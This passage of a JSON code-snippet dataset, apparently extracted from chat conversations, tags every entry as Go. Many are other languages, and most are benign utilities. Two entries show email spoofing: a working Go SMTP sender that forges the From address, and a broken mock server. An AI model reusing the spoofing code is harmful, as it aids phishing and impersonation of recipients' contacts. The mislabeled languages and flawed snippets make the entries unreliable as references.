    "code": "programa\n{\n    funcao inicio()\n    {\n        inteiro constante LARGURA = 10\n        inteiro constante ALTURA = 10\n        inteiro x = LARGURA / 2\n        inteiro y = ALTURA / 2\n        inteiro i, j\n\n        enquanto (verdadeiro) {\n            limpaTela()\n            para (i = 0; i < ALTURA; i++) {\n                para (j = 0; j < LARGURA; j++) {\n                    se (i == y && j == x) {\n                        escreva(\"#\")\n                    } senao {\n                        escreva(\".\")\n                    }\n                }\n                escreva(\"\\n\")\n            }\n            x = x + 1\n            aguarde(500)\n            \n            se (x >= LARGURA) {\n                x = 0\n            }\n        }\n    }\n\n    funcao limpaTela()\n    {\n        inteiro i\n        para(i = 0; i < 30; i++) {\n            escreva(\"\\n\")\n        }\n    }\n}",
    "filename": "5d333a7681ec69d944e7dc55ccafeb7f_1.go"
  },
  {
    "conversation_hash": "3f38daeaaaf51191e1bafaa73815ec5d",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "// tsconfig.json\n   {\n     \"compilerOptions\": {\n       \"jsx\": \"react\", // for React 17 or older, or \"react-jsx\" for React 18+\n       // ...other options\n     }\n   }",
    "filename": "3f38daeaaaf51191e1bafaa73815ec5d_1.go"
  },
  {
    "conversation_hash": "977ed08fb72a122b285c84facb81e94c",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc sumDigits(number int) int {\n    sum := 0\n    for number > 0 {\n        sum += number % 10 // Add the right-most digit to the sum.\n        number /= 10        // Remove the right-most digit.\n    }\n    return sum\n}\n\nfunc main() {\n    num := 12345\n    fmt.Println(sumDigits(num)) // Output will be 15\n}",
    "filename": "977ed08fb72a122b285c84facb81e94c_0.go"
  },
  {
    "conversation_hash": "977ed08fb72a122b285c84facb81e94c",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"strconv\"\n)\n\nfunc sumDigitsFromString(number int) int {\n\tstrNum := strconv.Itoa(number) // Convert the number to a string.\n\tsum := 0\n\tfor _, char := range strNum {\n\t\tdigit, _ := strconv.Atoi(string(char)) // Convert each character back to an integer.\n\t\tsum += digit\n\t}\n\treturn sum\n}\n\nfunc main() {\n\tnum := 12345\n\tfmt.Println(sumDigitsFromString(num)) // Output will be 15\n}",
    "filename": "977ed08fb72a122b285c84facb81e94c_1.go"
  },
  {
    "conversation_hash": "977ed08fb72a122b285c84facb81e94c",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n)\n\nfunc UniqueUserIDs(userIDs []int64) []int64 {\n\tseen := make(map[int64]struct{}) // Создаем map для отслеживания уникальных значений\n\tvar uniqueIDs []int64             // Слайс для хранения результата\n\n\tfor _, id := range userIDs {\n\t\tif _, exists := seen[id]; !exists {\n\t\t\tseen[id] = struct{}{} // Помечаем идентификатор как увиденный\n\t\t\tuniqueIDs = append(uniqueIDs, id) // Добавляем уникальный идентификатор в слайс\n\t\t}\n\t}\n\t\n\treturn uniqueIDs\n}\n\nfunc main() {\n\tuserIDs := []int64{1, 2, 3, 2, 4, 3, 5, 4, 1}\n\tfmt.Println(UniqueUserIDs(userIDs)) // Выведет [1 2 3 4 5]\n}",
    "filename": "977ed08fb72a122b285c84facb81e94c_2.go"
  },
  {
    "conversation_hash": "977ed08fb72a122b285c84facb81e94c",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "for _, id := range userIDs {\n    if _, exists := seen[id]; !exists {\n        seen[id] = struct{}{} // Помечаем идентификатор как увиденный\n        uniqueIDs = append(uniqueIDs, id) // Добавляем уникальный идентификатор в слайс\n    }\n}",
    "filename": "977ed08fb72a122b285c84facb81e94c_3.go"
  },
  {
    "conversation_hash": "472b3fefae3d57249cdac9b5e9df10f1",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n)\n\n// TreeNode определяет структуру узла дерева\ntype TreeNode struct {\n\tVal   int\n\tLeft  *TreeNode\n\tRight *TreeNode\n}\n\n// maxPathSumNode хранит информацию о максимальном пути и сумме для узла\ntype maxPathSumNode struct {\n\tpath []int\n\tsum  int\n}\n\n// helper возвращает максимальный путь для данного узла и обновляет максимальный путь для всего дерева\nfunc helper(node *TreeNode, globalMax *maxPathSumNode) maxPathSumNode {\n\tif node == nil {\n\t\treturn maxPathSumNode{path: []int{}, sum: 0}\n\t}\n\n\t// Рекурсивно обходим левый и правый подузлы.\n\tleft := helper(node.Left, globalMax)\n\tright := helper(node.Right, globalMax)\n\n\t// Находим максимальный путь через текущий узел (локальный максимум)\n\tlocalMax := left.sum\n\tpathThroughNode := append([]int{}, left.path...)\n\tif right.sum > localMax {\n\t\tlocalMax = right.sum\n\t\tpathThroughNode = append([]int{}, right.path...)\n\t}\n\tpathThroughNode = append(pathThroughNode, node.Val)\n\tlocalMax += node.Val\n\n\t// Обновляем глобальный максимум, если максимальный путь через текущий узел больше\n\tif localMax > globalMax.sum {\n\t\tglobalMax.sum = localMax\n\t\tglobalMax.path = pathThroughNode\n\t}\n\n\t// Возвращаем путь, который подключает текущий узел к его предку\n\treturn maxPathSumNode{path: pathThroughNode, sum: localMax}\n}\n\n// FindMaxPathSum возвращает список узлов с максимальной суммой в дереве\nfunc FindMaxPathSum(root *TreeNode) ([]int, int) {\n\tglobalMax := &maxPathSumNode{sum: -(1 << 31)}\n\thelper(root, globalMax)\n\treturn globalMax.path, globalMax.sum\n}\n\nfunc main() {\n\t// Пример использования функции:\n\t// Создаем дерево:\n\t//     10\n\t//    /  \\\n\t//   2    10\n\t//  / \\     \\\n\t// 20  1    -25\n\t//          /  \\\n\t//        3     4\n\n\troot := &TreeNode{\n\t\tVal: 10,\n\t\tLeft: &TreeNode{\n\t\t\tVal:   2,\n\t\t\tLeft:  &TreeNode{Val: 20},\n\t\t\tRight: &TreeNode{Val: 1},\n\t\t},\n\t\tRight: &TreeNode{\n\t\t\tVal: 10,\n\t\t\tRight: &TreeNode{\n\t\t\t\tVal: -25,\n\t\t\t\tLeft:  &TreeNode{Val: 3},\n\t\t\t\tRight: &TreeNode{Val: 4},\n\t\t\t},\n\t\t},\n\t}\n\n\tpath, sum := FindMaxPathSum(root)\n\tfmt.Printf(\"Максимальный путь: %#v, сумма: %d\\n\", path, sum)\n}",
    "filename": "472b3fefae3d57249cdac9b5e9df10f1_0.go"
  },
  {
    "conversation_hash": "89edc38472aacb379556c201d7cdb2d0",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package pkg\n\n// MostPopularWord возвращает наиболее часто встречающееся слово в срезе слов.\nfunc MostPopularWord(words []string) string {\n\twordCount := make(map[string]int) // Применяем короткую форму с :=\n\tfor _, word := range words {\n\t\twordCount[word]++\n\t}\n\tmaxCount := 0\n\tmostPopular := \"\" // Изменим имя переменной для избежания путаницы\n\tfor word, count := range wordCount {\n\t\tif count > maxCount {\n\t\t\tmaxCount = count\n\t\t\tmostPopular = word\n\t\t}\n\t}\n\treturn mostPopular\n}",
    "filename": "89edc38472aacb379556c201d7cdb2d0_0.go"
  },
  {
    "conversation_hash": "89edc38472aacb379556c201d7cdb2d0",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "for i := len(words) - 1; i >= 0; i -= 1 {\n    word := words[i]\n    wordsCount[word] += 1\n    if wordsCount[word] >= max {\n        max = wordsCount[word]\n        mostPopWord = word\n    }\n}",
    "filename": "89edc38472aacb379556c201d7cdb2d0_3.go"
  },
  {
    "conversation_hash": "89edc38472aacb379556c201d7cdb2d0",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n)\n\nfunc NextASCII(b byte) byte {\n\t// Получаем следующий ASCII символ, переходя на следующий байт.\n\t// Однако, это не учитывает переполнение за пределы диапазона ASCII,\n\t// поэтому если b == 127 (DEL), следующего символа в ASCII нет,\n\t// и функция просто вернет 128, что уже не является стандартным ASCII символом.\n\tif b < 127 {\n\t\treturn b + 1\n\t}\n\treturn b\n}\n\nfunc PrevASCII(b byte) byte {\n\t// Получаем предыдущий ASCII символ, переходя на предыдущий байт.\n\t// При этом учитываем, что символ с кодом 0 (NUL) - это первый символ ASCII таблицы,\n\t// и у него нет предшественника в ASCII.\n\tif b > 0 {\n\t\treturn b - 1\n\t}\n\treturn b\n}\n\nfunc main() {\n\tnext := NextASCII(byte('a')) // 'a' это 97, поэтому ожидаем получить 98\n\tprev := PrevASCII(byte('b')) // 'b' это 98, поэтому ожидаем получить 97\n\n\tfmt.Printf(\"NextASCII('a'): %d\\n\", next)\n\tfmt.Printf(\"PrevASCII('b'): %d\\n\", prev)\n}",
    "filename": "89edc38472aacb379556c201d7cdb2d0_5.go"
  },
  {
    "conversation_hash": "a68e9d40c16ff57b50dfe07a8733d3d8",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "\"soundevents/game_sounds_custom.vsndevts\"\n{\n    \"my_custom_looping_sound\"\n    {\n        \"channel\"       \"CHAN_STATIC\"\n        \"volume\"        \"1\"\n        \"soundlevel\"    \"SNDLVL_NONE\"\n        \"wave\"          \"path/to/your/soundfile.wav\"\n        \"loop\"          \"1\"\n    }\n}",
    "filename": "a68e9d40c16ff57b50dfe07a8733d3d8_2.go"
  },
  {
    "conversation_hash": "a68e9d40c16ff57b50dfe07a8733d3d8",
    "code_index": 8,
    "language": "Go",
    "libraries": [],
    "code": "\"npc_dota_hero_your_custom_hero_name\"\n{\n    // ... Другие свойства героя ...\n    \"Ability16\"\t\t\"your_custom_ability_name\"\n}",
    "filename": "a68e9d40c16ff57b50dfe07a8733d3d8_8.go"
  },
  {
    "conversation_hash": "c132d6f0b2975c606f91dce48f3f2925",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "SetBatchLines -1\nRandom, Time, 2700, 2730\nToggle := 0\n\nF1::\nToggle := !Toggle\nLoop\n{\n    If (Toggle)\n    {\n        Click, X1\n        Sleep, %Time%\n    }\n    else\n    {\n        break\n    }\n}",
    "filename": "c132d6f0b2975c606f91dce48f3f2925_0.go"
  },
  {
    "conversation_hash": "396f877ce1634025e99627e4155c72ac",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "enabled := true\nintervalMin := 2.7\nintervalMax := 2.73\n\nF1::\n    enabled := !enabled\n    Tooltip % (enabled ? \"Script Enabled\" : \"Script Disabled\")\n    if (enabled) {\n        SetTimer, TriggerMouse4, % GetRandomInterval()\n    } else {\n        SetTimer, TriggerMouse4, Off\n    }\n    return\n\nTriggerMouse4:\n    SendInput, {XButton1}\n    SetTimer, TriggerMouse4, % GetRandomInterval()\n    return\n\nGetRandomInterval() {\n    Random, interval, intervalMin * 1000, intervalMax * 1000\n    return interval\n}",
    "filename": "396f877ce1634025e99627e4155c72ac_4.go"
  },
  {
    "conversation_hash": "e5107520cf479cfb76f0443e79c8df9e",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "toggleKey := \"F1\"\nminDelay := 2700\nmaxDelay := 2730\nisEnabled := false\n\nPressMouseButton() {\n    SendInput {XButton2 down}\n    Sleep 50\n    SendInput {XButton2 up}\n}\n\nToggleScript() {\n    isEnabled := !isEnabled\n    if (isEnabled) {\n        while(isEnabled) {\n            delay := Random(minDelay, maxDelay)\n            PressMouseButton()\n            Sleep delay\n        }\n    }\n}\n\nF1::\n    ToggleScript()\n    return",
    "filename": "e5107520cf479cfb76f0443e79c8df9e_1.go"
  },
  {
    "conversation_hash": "e5107520cf479cfb76f0443e79c8df9e",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "#SingleInstance, Force\n\ntoggleKey := \"F1\"\nminDelay := 2700\nmaxDelay := 2730\n\nisEnabled := false\n\nPressMouseButton() {\n    SendInput {XButton2 down}\n    Sleep 50\n    SendInput {XButton2 up}\n}\n\nToggleScript() {\n    isEnabled := !isEnabled\n    while isEnabled {\n        delay := Random(minDelay, maxDelay)\n        PressMouseButton()\n        Sleep delay\n    }\n}\n\n$F1::\n    ToggleScript()\n    return",
    "filename": "e5107520cf479cfb76f0443e79c8df9e_3.go"
  },
  {
    "conversation_hash": "e5107520cf479cfb76f0443e79c8df9e",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "#SingleInstance, Force\n\ntoggleKey := \"F1\"\nminDelay := 2700\nmaxDelay := 2730\n\nisEnabled := false\n\nPressMouseButton() {\n    SendInput {XButton2 down}\n    Sleep 50\n    SendInput {XButton2 up}\n}\n\nToggleScript() {\n    isEnabled := !isEnabled\n    while isEnabled {\n        Random, delay, %minDelay%, %maxDelay%\n        PressMouseButton()\n        Sleep delay\n    }\n}\n\n$F1::\n    ToggleScript()\n    return",
    "filename": "e5107520cf479cfb76f0443e79c8df9e_4.go"
  },
  {
    "conversation_hash": "737e7611dd0a783b5e8910bfae6a2b9f",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "{\n \"景别\":\"室内办公室\",\n \"角度\":\"特写,正面\",\n \"光效\":\"冷白色荧光灯\",\n \"背景\":\"办公桌,文件,咖啡杯,散落的纸张\",\n \"角色\":{ \"张仁杰\":{\"动作\":\"拍案而起\",\"姿势\":\"站立\",\"神态\":\"怒发冲冠\"} }\n}",
    "filename": "737e7611dd0a783b5e8910bfae6a2b9f_0.go"
  },
  {
    "conversation_hash": "f658a52690e6e839c8060a32aba7248a",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "<tr *ngFor=\"let v of ventas\">\n  <td>{{ v.idventa }}</td>\n  <td>{{ getClientName(v.idcliente) }}</td>\n  <td>{{ v.idtrabajador }}</td>\n  <td>{{ v.num_comprobante }}</td>\n  <td>{{ v.fecha }}</td>\n  <td>{{ v.total }}</td>\n</tr>",
    "filename": "f658a52690e6e839c8060a32aba7248a_2.go"
  },
  {
    "conversation_hash": "ab7dd642fd52871dfd3b3b15e314f72c",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"html/template\"\n    \"net/http\"\n)\n\ntype PageData struct {\n    Title   string\n    Message string\n}\n\nfunc main() {\n    tmpl := template.Must(template.ParseFiles(\"template.html\"))\n\n    http.HandleFunc(\"/\", func(w http.ResponseWriter, r *http.Request) {\n        data := PageData{\n            Title:   \"Привет, мир!\",\n            Message: \"Это сообщение из шаблона.\",\n        }\n        tmpl.Execute(w, data)\n    })\n\n    // Подключаем каталог со статическими файлами\n    fs := http.FileServer(http.Dir(\"static/\"))\n    http.Handle(\"/static/\", http.StripPrefix(\"/static/\", fs))\n\n    http.ListenAndServe(\":8080\", nil)\n}",
    "filename": "ab7dd642fd52871dfd3b3b15e314f72c_2.go"
  },
  {
    "conversation_hash": "acee21991c16d3e65d313e2567a33c5c",
    "code_index": 26,
    "language": "Go",
    "libraries": [
      "the"
    ],
    "code": "package main\n\nimport (\n\t\"net/http\"\n\t\"log\"\n)\n\nfunc main() {\n\t// Serve static files from the \"public\" directory.\n\tfs := http.FileServer(http.Dir(\"public\"))\n\thttp.Handle(\"/\", fs)\n\n\tlog.Println(\"Listening on :8080...\")\n\terr := http.ListenAndServe(\":8080\", nil)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n}",
    "filename": "acee21991c16d3e65d313e2567a33c5c_26.go"
  },
  {
    "conversation_hash": "57dabc1a233e4bd9e4ae2dc50a41e879",
    "code_index": 37,
    "language": "Go",
    "libraries": [],
    "code": "// Calculation of a point on a bezier curve\n// u must be between 0 and 1\n// By Casteljau's method\n// By Horner's method\n// Restricting the useful domain of the curve\n// The initial limits of the curve are\n// assumed to be [0,1]\n// Calculation of a point, tangent and normal on a bezier curve\n// u must be between 0 and 1\n// Calculation of a point, tangent and normal on a bezier curve\n// u must be between 0 and 1\n// Calculation of a point, tangent and normal on a bezier curve\n// u must be between 0 and 1\n// Calculation of a point, tangent and normal on a bezier curve\n// u must be between 0 and 1",
    "filename": "57dabc1a233e4bd9e4ae2dc50a41e879_37.go"
  },
  {
    "conversation_hash": "59910ff343aa601208121b2ff209202d",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "project-name/\n│\n├── config/\n│   ├── default.json\n│   ├── development.json\n│   └── production.json\n│\n├── src/\n│   ├── api/\n│   │   ├── middleware/\n│   │   │   ├── authenticate.js\n│   │   │   └── authorize.js\n│   │   ├── controllers/\n│   │   │   ├── authController.js\n│   │   │   ├── fileController.js\n│   │   │   └── processDataController.js\n│   │   ├── routes/\n│   │   │   ├── authRouter.js\n│   │   │   ├── fileRouter.js\n│   │   │   └── processDataRouter.js\n│   │   └── validators/\n│   │       └── fileValidator.js\n│   │\n│   ├── db/\n│   │   ├── models/\n│   │   │   ├── interfaceLogModel.js\n│   │   │   ├── userModel.js\n│   │   │   └── ...\n│   │   └── index.js\n│   │\n│   ├── services/\n│   │   ├── authService.js\n│   │   ├── fileService.js\n│   │   ├── processDataService.js\n│   │   └── externalApiService.js\n│   │\n│   ├── utils/\n│   │   ├── errorHandler.js\n│   │   ├── logger.js\n│   │   └── ...\n│   │\n│   ├── app.js\n│   └── server.js\n│\n├── test/\n│   └── ...\n│\n├── .env\n├── .gitignore\n├── package.json\n└── README.md",
    "filename": "59910ff343aa601208121b2ff209202d_0.go"
  },
  {
    "conversation_hash": "269e58b62e70c5b4f74b0f6e43fed655",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "━━━━━━━━━━━━━━━━━━━━\n      땅콩박사 독서기록장\n━━━━━━━━━━━━━━━━━━━━\n1. 책 제목: ___________________________\n2. 저 자: _____________________________\n3. 출판사: ____________________________\n4. 읽은 기간: _________________________\n5. 책 소개:\n   (이 책에서 다루고 있는 주제나 이야기 개요를 간단히 적어보세요.)\n   ____________________________________\n   ____________________________________\n   ____________________________________\n\n6. 내가 배운 점/느낀 점:\n   (책을 읽고 난 후 당신의 생각이나 감정, 배운 지식을 적어보세요.)\n   ____________________________________\n   ____________________________________\n   ____________________________________\n\n7. 좋았던 구절/인용문:\n   (\"________\" - 페이지 __)\n   ____________________________________\n   ____________________________________\n\n8. 별점 평가:\n   (★을 사용해서 당신이 생각하는 이 책의 점수를 매겨보세요. 예: ★★★★☆)\n\n9. 추천 여부:\n   (다른 사람들에게 이 책을 추천하겠습니까? 그 이유는 무엇인가요?)\n   ____________________________________\n   ____________________________________\n━━━━━━━━━━━━━━━━━━━━",
    "filename": "269e58b62e70c5b4f74b0f6e43fed655_0.go"
  },
  {
    "conversation_hash": "d60bb4ac35f3e4228da306028f792535",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "_asm {\n    mov eax, a\n    mov ebx, x\n    cmp bl, al\n    ja Higher\n    mov y1, 5\n    jmp L1\n    Higher:\n    sub bl, al\n    mov y1, ebx\n    L1:\n}",
    "filename": "d60bb4ac35f3e4228da306028f792535_1.go"
  },
  {
    "conversation_hash": "d60bb4ac35f3e4228da306028f792535",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "_asm {\n    mov eax, a\n    mov ebx, x\n    cmp bl, al\n    ja Higher\n    mov y1, 5\n    jmp L1\n    Higher:\n    sub bl, al\n    mov y1, ebx\n    L1:\n}\n\n// Код, который не входит в блок Higher\n\n// Продолжаем писать код здесь",
    "filename": "d60bb4ac35f3e4228da306028f792535_2.go"
  },
  {
    "conversation_hash": "d60bb4ac35f3e4228da306028f792535",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "_asm {\n    mov eax, a\n    mov ebx, x\n    cmp bl, al\n    ja Higher\n    mov y1, 5\n    jmp AfterHigher  // переход после блока Higher\nHigher:\n    sub bl, al\n    mov y1, ebx\nAfterHigher:\n    // Код, который НЕ входит в блок Higher\n\n    // Продолжайте писать код здесь\n}",
    "filename": "d60bb4ac35f3e4228da306028f792535_3.go"
  },
  {
    "conversation_hash": "93331f5452550b28e617ab51b24865f1",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "_asm {\n    lea esi, source\n    lea edi, temp\n    mov ecx, len\n    xor edx, edx\n\n    count_words :\n    cmp byte ptr[esi], ' '\n        jne next_char\n        inc edx\n\n        next_char :\n    mov al, byte ptr[esi]\n        mov byte ptr[edi], al\n        inc esi\n        inc edi\n        dec ecx\n        loop count_words\n\n        inc edx\n        mov byte ptr[edi], 0\n\n    mov wordCount, edx\n}",
    "filename": "93331f5452550b28e617ab51b24865f1_3.go"
  },
  {
    "conversation_hash": "b7c12ab8bd3e0cfce2e635d9e1ea9dce",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"bufio\"\n    \"fmt\"\n    \"os\"\n    \"strings\"\n)\n\nfunc main() {\n    scanner := bufio.NewScanner(os.Stdin)\n\n    for {\n        fmt.Print(\"Enter command: \")\n        scanner.Scan()\n        command := scanner.Text()\n\n        // Parse the command\n        commandParts := strings.Fields(command)\n\n        // Check the command keyword and perform respective actions\n        switch commandParts[0] {\n        case \"quit\", \"exit\":\n            fmt.Println(\"CLI app terminated.\")\n            os.Exit(0)\n\n        // ... Additional cases for other commands ...\n\n        default:\n            fmt.Println(\"Invalid command. Please try again.\")\n        }\n    }\n}",
    "filename": "b7c12ab8bd3e0cfce2e635d9e1ea9dce_1.go"
  },
  {
    "conversation_hash": "3b6755ba7bb405f2d988e1ff3123625d",
    "code_index": 9,
    "language": "Go",
    "libraries": [],
    "code": "package main\nimport \"fmt\"\nfunc main() {\n    fmt.Println(\"Hello, World!\")\n}",
    "filename": "3b6755ba7bb405f2d988e1ff3123625d_9.go"
  },
  {
    "conversation_hash": "3b6755ba7bb405f2d988e1ff3123625d",
    "code_index": 44,
    "language": "Go",
    "libraries": [],
    "code": "package main\nimport \"fmt\"\nfunc main() {\n    fmt.Println(\"Hello, World!\")\n}",
    "filename": "3b6755ba7bb405f2d988e1ff3123625d_44.go"
  },
  {
    "conversation_hash": "9bfff5198dc699981a2ac1884fe7bfbb",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"net/smtp\"\n\t\"strings\"\n)\n\nfunc main() {\n\t// Set up authentication information.\n\tauth := smtp.PlainAuth(\n\t\t\"\",\n\t\t\"your_email@example.com\", // Your real username\n\t\t\"your_password\",          // Your real password\n\t\t\"smtp.example.com\",       // SMTP server\n\t)\n\n\t// The recipient's email address\n\tto := []string{\"recipient@example.com\"}\n\n\t// The sender's email address (this will be spoofed)\n\tfrom := \"spoofed_address@fakedomain.com\"\n\n\t// The email headers & body\n\tmsg := strings.Join([]string{\n\t\t\"From: \" + from,\n\t\t\"To: \" + strings.Join(to, \", \"),\n\t\t\"Subject: Spoofed Email Example\",\n\t\t\"Content-Type: text/plain; charset=UTF-8\",\n\t\t\"\",\n\t\t\"This is the body of the email.\",\n\t}, \"\\r\\n\")\n\n\t// Connect to the server, authenticate, set the sender's and recipients' address,\n\t// and send the email all in one step.\n\terr := smtp.SendMail(\n\t\t\"smtp.example.com:25\", // The SMTP server with the port\n\t\tauth,\n\t\tfrom, // The (spoofed) \"from\" address used in the SMTP conversation\n\t\tto,\n\t\t[]byte(msg),\n\t)\n\n\tif err != nil {\n\t\tpanic(err)\n\t}\n}",
    "filename": "9bfff5198dc699981a2ac1884fe7bfbb_0.go"
  },
  {
    "conversation_hash": "9bfff5198dc699981a2ac1884fe7bfbb",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"net\"\n\t\"net/smtp\"\n\t\"net/textproto\"\n\t\"strings\"\n)\n\nfunc main() {\n\tlistener, err := net.Listen(\"tcp\", \"localhost:2525\")\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer listener.Close()\n\tlog.Println(\"SMTP server listening on localhost:2525\")\n\n\tfor {\n\t\tconn, err := listener.Accept()\n\t\tif err != nil {\n\t\t\tlog.Print(err)\n\t\t\tcontinue\n\t\t}\n\t\tgo handleConnection(conn)\n\t}\n}\n\nfunc handleConnection(conn net.Conn) {\n\tdefer conn.Close()\n\tlog.Printf(\"Connection from %v\", conn.RemoteAddr())\n\n\ttp := textproto.NewConn(conn)\n\tdefer tp.Close()\n\n\t// SMTP handshake\n\ttp.PrintfLine(\"220 %s ESMTP GoMockSMTP\", \"localhost\")\n\tif _, _, err := tp.ReadResponse(220); err != nil {\n\t\tlog.Print(err)\n\t\treturn\n\t}\n\n\t// SMTP sequence\n\ttp.PrintfLine(\"250-Hello\")\n\tif _, _, err := tp.ReadResponse(250); err != nil {\n\t\tlog.Print(err)\n\t\treturn\n\t}\n\n\t// Spoofed FROM address and RCPT TO\n\tfrom := \"spoofed_address@fakedomain.com\"\n\tto := \"recipient@example.com\"\n\ttp.PrintfLine(\"250 OK\")\n\n\t// DATA command\n\tdata, _, _ := tp.ReadResponse(250)\n\tif strings.ToUpper(data) == \"DATA\" {\n\t\ttp.PrintfLine(\"354 End data with <CR><LF>.<CR><LF>\")\n\t}\n\n\t// Message body\n\ttp.PrintfLine(\"From: %s\", from)\n\ttp.PrintfLine(\"To: %s\", to)\n\ttp.PrintfLine(\"Subject: Spoofed Email Example\")\n\ttp.PrintfLine(\"\")\n\ttp.PrintfLine(\"This is the body of the email.\")\n\ttp.PrintfLine(\".\")\n\n\t// End of DATA\n\ttp.PrintfLine(\"250 OK\")\n\n\t// QUIT command\n\tquit, _, _ := tp.ReadResponse(250)\n\tif strings.ToUpper(quit) == \"QUIT\" {\n\t\ttp.PrintfLine(\"221 Bye\")\n\t}\n\n\tlog.Println(\"Handled spoofed email sent through mock SMTP server\")\n}",
    "filename": "9bfff5198dc699981a2ac1884fe7bfbb_1.go"
  },
  {
    "conversation_hash": "76729551be6a0fd32a4384ee9ca74183",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "type WebsiteInteraction interface {\n        FetchData() (*SomeDataType, error)\n        ProcessData(data *SomeDataType) (*ProcessedData, error)\n        // ...\n    }",
    "filename": "76729551be6a0fd32a4384ee9ca74183_0.go"
  },
  {
    "conversation_hash": "76729551be6a0fd32a4384ee9ca74183",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "type WebsiteA struct {\n        //Site-specific fields\n    }\n\n    func (wa *WebsiteA) FetchData() (*SomeDataType, error) {\n        //Site A fetching logic\n    }\n\n    func (wa *WebsiteA) ProcessData(data *SomeDataType) (*ProcessedData, error) {\n        //Site A processing logic\n    }\n\n    // Repeat for each website...",
    "filename": "76729551be6a0fd32a4384ee9ca74183_1.go"
  },
  {
    "conversation_hash": "46378449da9565e1768b9110b6069a92",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc main() {\n\t// Создание массива workArray на 10 элементов.\n\t// Т.к. нужно минимально возможное беззнаковое целое число, используем uint8,\n\t// которое имеет диапазон от 0 до 255 и является минимальным беззнаковым типом.\n\tvar workArray [10]uint8\n\n\t// Считывание 10 чисел и запись их в массив workArray.\n\tfor i := 0; i < 10; i++ {\n\t\tvar number uint8\n\t\t_, err := fmt.Scanf(\"%d\", &number)\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Error reading input:\", err)\n\t\t\treturn\n\t\t}\n\t\tworkArray[i] = number\n\t}\n\n\t// Чтение 3 пар индексов и обмен элементов на этих позициях.\n\tfor i := 0; i < 3; i++ {\n\t\tvar index1, index2 int\n\t\t_, err := fmt.Scanf(\"%d %d\", &index1, &index2)\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Error reading input:\", err)\n\t\t\treturn\n\t\t}\n\t\t// Меняем элементы местами, используя введенные индексы.\n\t\tworkArray[index1], workArray[index2] = workArray[index2], workArray[index1]\n\t}\n\n\t// Вывод элементов массива через пробел.\n\tfor _, v := range workArray {\n\t\tfmt.Printf(\"%d \", v)\n\t}\n}",
    "filename": "46378449da9565e1768b9110b6069a92_0.go"
  },
  {
    "conversation_hash": "f9c83b3bffb8d04e7a7a4904d0e37d82",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "fallback() external payable {\n    LibDiamond.DiamondStorage storage ds;\n    bytes32 position = LibDiamond.DIAMOND_STORAGE_POSITION;\n    assembly {\n        ds.slot := position\n    }\n    address facet = ds.selectorToFacetAndPosition[msg.sig].facetAddress;\n    require(facet != address(0), \"Diamond: Function does not exist\");\n    ...\n}",
    "filename": "f9c83b3bffb8d04e7a7a4904d0e37d82_0.go"
  },
  {
    "conversation_hash": "f9c83b3bffb8d04e7a7a4904d0e37d82",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "fallback() external payable {\n    LibDiamond.DiamondStorage storage ds;\n    ...\n    address facet = ds.selectorToFacetAndPosition[msg.sig].facetAddress;\n    require(facet != address(0), \"Diamond: Function does not exist\");\n    assembly {\n        calldatacopy(0, 0, calldatasize())\n        let result := delegatecall(gas(), facet, 0, calldatasize(), 0, 0)\n        returndatacopy(0, 0, returndatasize())\n        switch result\n        case 0 {\n            revert(0, returndatasize())\n        }\n        default {\n            return(0, returndatasize())\n        }\n    }\n}",
    "filename": "f9c83b3bffb8d04e7a7a4904d0e37d82_5.go"
  },
  {
    "conversation_hash": "8fa8a2e0305cd368c7681a2a55032787",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
